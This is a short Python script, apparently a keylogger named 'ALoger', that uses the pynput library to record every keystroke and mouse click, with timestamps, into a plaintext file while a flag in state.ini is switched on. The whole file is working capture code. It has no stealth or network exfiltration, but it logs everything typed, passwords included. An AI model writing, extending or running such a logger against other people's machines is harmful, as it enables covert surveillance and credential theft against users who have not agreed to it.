import logging
from pynput import keyboard, mouse
from datetime import datetime
import configparser
import time
import os

# Setup logging format
logging.basicConfig(filename="keys.txt", level=logging.DEBUG, format='%(message)s')

def get_time():
    return datetime.now().strftime("%d/%b/%Y-%I:%M:%S:%f%p")

def is_active():
    config = configparser.ConfigParser()
    config.read('state.ini')
    return config.get('Status', 'active') == 'on'

def on_press(key):
    if not is_active():
        return False # Stops listener
    try:
        logging.info(f"[{get_time()}]- key: {key.char}")
    except AttributeError:
        logging.info(f"[{get_time()}]- key: {key}")

def on_click(x, y, button, pressed):
    if not is_active():
        return False
    if pressed:
        logging.info(f"[{get_time()}]- Mos: {button} at ({x}, {y})")

# Header for the log session
if is_active():
    with open("keys.txt", "a") as f:
        f.write(f"\n[ALoger]\n[On:{get_time()}]\n\n")

    with keyboard.Listener(on_press=on_press) as k_listener, \
         mouse.Listener(on_click=on_click) as m_listener:
        k_listener.join()
        m_listener.join()